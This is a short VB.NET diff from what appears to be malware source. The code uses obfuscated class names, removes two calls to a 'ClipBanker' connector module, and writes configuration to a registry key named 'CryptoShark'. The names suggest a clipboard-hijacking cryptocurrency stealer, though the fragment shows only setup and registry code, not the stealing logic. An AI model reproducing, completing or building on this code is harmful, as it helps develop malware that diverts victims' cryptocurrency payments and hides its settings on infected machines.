@@ -9,8 +9,6 @@ Public Class Class2
             Gclass1.Port = Class3.method1
             Gclass1.KEY = Class4.method3
             Gclass1.Blocked = New List(Of String)
-            ClipBanker.Connector.SetUp()
-            ClipBanker.Connector.Shutdown()
             Try
                 My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
     "Port", Class5.return1)
